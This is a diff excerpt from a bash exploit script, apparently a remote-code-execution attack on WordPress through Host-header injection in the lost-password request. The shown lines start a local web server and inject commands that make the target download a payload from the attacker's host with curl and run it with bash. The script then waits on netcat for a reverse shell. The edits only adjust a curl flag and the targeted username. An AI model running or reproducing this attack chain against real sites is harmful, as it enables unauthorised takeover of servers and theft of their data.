@@ -70,14 +70,14 @@ echo "$RCE_exec_cmd" > rce.txt
 python -m SimpleHTTPServer 80 2>/dev/null >&2 &
 hpid=$!
 # Save payload on the target in /tmp/rce
-cmd="/usr/bin/curl -o/tmp/rce $rev_host/rce.txt"
+cmd="/usr/bin/curl -o /tmp/rce $rev_host/rce.txt"
 prep_host_header "$cmd"
-curl -H"Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' $target/wordpress/wp-login.php?action=lostpassword
+curl -H"Host: $host_header" -s -d 'user_login=MS&wp-submit=Get+New+Password' $target/wordpress/wp-login.php?action=lostpassword
 echo -e "\n\e[92m[+]\e[0m Payload sent successfully"
 # Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
 cmd="/bin/bash /tmp/rce"
 prep_host_header "$cmd"
-curl -H"Host: $host_header" -d 'user_login=admin&wp-submit=Get+New+Password' $target/wordpress/wp-login.php?action=lostpassword &
+curl -H"Host: $host_header" -d 'user_login=MS&wp-submit=Get+New+Password' $target/wordpress/wp-login.php?action=lostpassword &
 echo -e "\n\e[92m[+]\033[0m Payload executed!"
 echo -e "\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n"
 nc -vv -l 1337
